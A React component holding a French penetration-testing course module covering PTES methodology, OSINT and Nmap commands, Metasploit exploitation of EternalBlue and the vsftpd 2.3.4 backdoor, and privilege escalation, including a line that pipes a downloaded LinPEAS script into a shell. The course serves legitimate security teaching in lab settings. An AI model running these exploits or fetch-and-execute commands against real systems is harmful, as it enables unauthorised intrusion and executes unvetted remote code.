import React from 'react';

const Module6 = () => {
    return (
        <div className="module-content">
            <div className="module-header">
                <h1>Module 6 : Tests d intrusion (Pentest)</h1>
                <div className="module-meta">Duree : 10 heures | Niveau : Avance</div>
            </div>

            <div className="module-section">
                <h2>6.1 Methodologie PTES</h2>
                <ol>
                    <li>Pre-engagement</li>
                    <li>Reconnaissance</li>
                    <li>Modelisation des menaces</li>
                    <li>Analyse des vulnerabilites</li>
                    <li>Exploitation</li>
                    <li>Post-exploitation</li>
                    <li>Reporting</li>
                </ol>
                <div className="warning-box">
                    Attention : Un pentest sans autorisation est ILLEGAL
                </div>
            </div>

            <div className="module-section">
                <h2>6.2 Reconnaissance (OSINT)</h2>
                <div className="command-box">
                    theHarvester -d example.com -b google<br />
                    shodan search apache<br />
                    dnsrecon -d example.com<br />
                    whois example.com
                </div>
            </div>

            <div className="module-section">
                <h2>6.3 Scan avec Nmap</h2>
                <div className="command-box">
                    nmap -sV -sC -p- target.com<br />
                    nmap -sU -p 53,161 target.com<br />
                    nmap --script vuln target.com
                </div>
            </div>

            <div className="module-section">
                <h2>6.4 Exploitation Metasploit</h2>
                <div className="command-box">
                    msfconsole<br />
                    search exploit eternalblue<br />
                    use exploit/windows/smb/ms17_010_eternalblue<br />
                    set RHOSTS target<br />
                    run
                </div>
            </div>

            <div className="module-section">
                <h2>6.5 Elevation de privileges</h2>
                <div className="command-box">
                    find / -perm -4000 -type f<br />
                    sudo -l<br />
                    curl -L https://github.com/peass-ng/linpeas.sh | sh
                </div>
            </div>

            <div className="module-section">
                <h2>Exercices pratiques</h2>
                
                <div className="exercise-box">
                    <h3>Exercice 1 : Scan Nmap</h3>
                    <p>Scannez Metasploitable 2.</p>
                    <details>
                        <summary>Voir la solution</summary>
                        <div className="command-box">
                            nmap -sV -sC -p- 192.168.1.100
                        </div>
                    </details>
                </div>

                <div className="exercise-box">
                    <h3>Exercice 2 : Exploitation Metasploit</h3>
                    <p>Exploitez vsftpd 2.3.4.</p>
                    <details>
                        <summary>Voir la solution</summary>
                        <div className="command-box">
                            use exploit/unix/ftp/vsftpd_234_backdoor<br />
                            set RHOSTS target<br />
                            run
                        </div>
                    </details>
                </div>
            </div>

            <div className="module-section">
                <h2>Ressources</h2>
                <ul>
                    <li><a href="https://www.metasploit.com/">Metasploit</a></li>
                    <li><a href="https://tryhackme.com/">TryHackMe</a></li>
                    <li><a href="https://www.hackthebox.com/">Hack The Box</a></li>
                </ul>
            </div>
        </div>
    );
};

export default Module6;